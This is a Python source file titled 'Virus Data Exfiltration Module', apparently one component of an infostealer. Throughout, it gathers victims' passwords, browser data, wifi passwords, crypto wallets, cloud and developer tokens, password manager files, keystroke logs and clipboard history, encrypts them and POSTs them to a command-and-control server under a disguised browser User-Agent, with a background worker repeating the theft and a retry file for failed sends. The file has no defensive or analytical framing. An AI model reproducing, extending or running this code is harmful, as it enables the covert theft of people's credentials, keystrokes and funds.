"""
Virus Data Exfiltration Module
"""
import os
import json
import time
import sys
import urllib.request
import urllib.parse
import urllib.error
import hashlib
from virus_config import *
from virus_utils import log_activity, encrypt_data
from virus_data_collection import (
    collect_passwords, collect_sensitive_files, collect_browser_data,
    collect_wifi_passwords, collect_email_configs, collect_database_files,
    collect_crypto_wallets, collect_recent_documents, collect_system_info_comprehensive,
    collect_application_tokens, collect_cloud_storage_configs,
    collect_development_tokens, collect_password_manager_files,
    collect_all_config_files
)

def exfiltrate_data():
    """Send collected data to remote C2 server"""
    if not ENABLE_DATA_EXFILTRATION:
        return
    
    try:
        # Use normalized_data.json (ONLY FILE - clean, deduplicated, accurate)
        data_file = f"{DATA_DIR}/normalized_data.json"
        
        data_package = {}
        if os.path.exists(data_file):
            try:
                with open(data_file, 'r', encoding='utf-8') as f:
                    data_package = json.load(f)
            except:
                data_package = {}
        
        if 'timestamp' not in data_package:
            data_package['timestamp'] = time.strftime("%Y-%m-%dT%H:%M:%S")
        if 'hostname' not in data_package:
            data_package['hostname'] = os.uname().nodename if hasattr(os, 'uname') else 'unknown'
        if 'user' not in data_package:
            data_package['user'] = os.getenv('USER', 'unknown')
        
        if 'system' not in data_package:
            data_package['system'] = {
                'platform': sys.platform,
                'python_version': sys.version,
            }
        
        if 'passwords' not in data_package:
            data_package['passwords'] = collect_passwords()
        if 'sensitive_files' not in data_package:
            data_package['sensitive_files'] = collect_sensitive_files()
        if 'browser_data' not in data_package:
            data_package['browser_data'] = collect_browser_data()
        if 'wifi_passwords' not in data_package:
            data_package['wifi_passwords'] = collect_wifi_passwords()
        if 'email_configs' not in data_package:
            data_package['email_configs'] = collect_email_configs()
        if 'databases' not in data_package:
            data_package['databases'] = collect_database_files()
        if 'crypto_wallets' not in data_package:
            data_package['crypto_wallets'] = collect_crypto_wallets()
        if 'recent_documents' not in data_package:
            data_package['recent_documents'] = collect_recent_documents()
        if 'system_info' not in data_package:
            data_package['system_info'] = collect_system_info_comprehensive()
        
        # Enhanced data collection
        if 'application_tokens' not in data_package:
            data_package['application_tokens'] = collect_application_tokens()
        if 'cloud_storage_configs' not in data_package:
            data_package['cloud_storage_configs'] = collect_cloud_storage_configs()
        if 'development_tokens' not in data_package:
            data_package['development_tokens'] = collect_development_tokens()
        if 'password_manager_files' not in data_package:
            data_package['password_manager_files'] = collect_password_manager_files()
        if 'config_files' not in data_package:
            data_package['config_files'] = collect_all_config_files()
        
        # KEYBOARD LOGS - ALWAYS read directly from keyboard_log.txt file (FRESH DATA)
        # Never use normalized_data.json for keyboard logs - it's stale
        # Read the latest keyboard_log.txt every time to get all new keystrokes
        keyboard_logs_content = ""
        log_file = f"{DATA_DIR}/{LOG_FILE}"
        
        # ALWAYS read directly from keyboard_log.txt to get the latest keystrokes
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                    keyboard_logs_content = f.read()
                    log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS read from {log_file}: {len(keyboard_logs_content)} chars, {keyboard_logs_content.count(chr(10))} lines")
            except Exception as e:
                log_activity("EXFILTRATION", f"❌ Error reading keyboard logs from {log_file}: {e}")
                keyboard_logs_content = ""
        else:
            log_activity("EXFILTRATION", f"⚠️  Keyboard log file not found: {log_file}")
            # Try alternative path (if DATA_DIR doesn't exist yet)
            alt_log_file = LOG_FILE
            if os.path.exists(alt_log_file):
                try:
                    with open(alt_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                        keyboard_logs_content = f.read()
                        log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS read from {alt_log_file}: {len(keyboard_logs_content)} chars")
                except Exception as e:
                    log_activity("EXFILTRATION", f"❌ Error reading from {alt_log_file}: {e}")
        
        # ALWAYS set keyboard logs in data package (even if empty)
        # This ensures keyboard_logs are sent with every exfiltration
        data_package['keyboard_logs'] = keyboard_logs_content
        data_package['activity_logs'] = keyboard_logs_content  # Same content, merged
        data_package['keyboard_logs_size'] = len(keyboard_logs_content)
        data_package['keyboard_logs_lines'] = keyboard_logs_content.count('\n')
        
        # Log final status with verification
        if keyboard_logs_content:
            log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS ready to send: {len(keyboard_logs_content)} chars, {keyboard_logs_content.count(chr(10))} lines")
            # Verify it's actually in data_package
            if 'keyboard_logs' in data_package and data_package['keyboard_logs']:
                log_activity("EXFILTRATION", f"✅ Verified: keyboard_logs in data_package ({len(data_package['keyboard_logs'])} chars)")
            else:
                log_activity("EXFILTRATION", f"❌ WARNING: keyboard_logs NOT in data_package!")
        else:
            log_activity("EXFILTRATION", f"⚠️  No keyboard logs to send (file empty or not found)")
        
        # Clipboard history
        data_package['clipboard_history'] = []
        
        # Also include clipboard history if available
        clipboard_file = f"{DATA_DIR}/clipboard_history.txt"
        if os.path.exists(clipboard_file):
            try:
                with open(clipboard_file, 'r', encoding='utf-8', errors='ignore') as f:
                    clipboard_content = f.read()
                    data_package['clipboard_history'] = clipboard_content.split('\n') if clipboard_content else []
                    data_package['clipboard_history_size'] = len(clipboard_content)
            except:
                pass
        
        # Verify keyboard logs are in data package before encryption
        if 'keyboard_logs' in data_package:
            kb_size = len(data_package['keyboard_logs']) if isinstance(data_package['keyboard_logs'], str) else 0
            log_activity("EXFILTRATION", f"📦 Data package contains keyboard_logs: {kb_size} chars")
        else:
            log_activity("EXFILTRATION", f"❌ WARNING: keyboard_logs missing from data_package before encryption!")
        
        encrypted_payload = encrypt_data(json.dumps(data_package))
        
        # Log size of encrypted payload
        log_activity("EXFILTRATION", f"📦 Encrypted payload size: {len(encrypted_payload)} bytes")
        
        try:
            payload = {
                'data': encrypted_payload,
                'key': hashlib.md5(C2_KEY.encode()).hexdigest(),
                'host': data_package['hostname']
            }
            
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(C2_SERVER, data=data, method='POST')
            req.add_header('User-Agent', 'Mozilla/5.0')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                response_data = response.read().decode('utf-8', errors='ignore')
                log_activity("EXFILTRATION", f"Data sent successfully to {C2_SERVER}: {len(encrypted_payload)} bytes")
                log_activity("EXFILTRATION", f"Server response: {response_data[:200]}")
        except urllib.error.URLError as e:
            log_activity("EXFILTRATION", f"Connection error to {C2_SERVER}: {e}")
            # Save to pending upload file for retry
            try:
                with open(EXFILTRATION_FILE, 'w') as f:
                    json.dump(data_package, f, indent=2)
                log_activity("EXFILTRATION", f"Data saved to {EXFILTRATION_FILE} for retry")
            except:
                pass
        except Exception as e:
            log_activity("EXFILTRATION", f"Error sending data to {C2_SERVER}: {type(e).__name__}: {e}")
            # Save to pending upload file for retry
            try:
                with open(EXFILTRATION_FILE, 'w') as f:
                    json.dump(data_package, f, indent=2)
                log_activity("EXFILTRATION", f"Data saved to {EXFILTRATION_FILE} for retry")
            except:
                pass
    except:
        pass

def exfiltration_worker():
    """Background worker for periodic data exfiltration"""
    while True:
        try:
            if ENABLE_DATA_EXFILTRATION:
                exfiltrate_data()
            time.sleep(EXFILTRATION_INTERVAL)
        except:
            time.sleep(EXFILTRATION_INTERVAL)

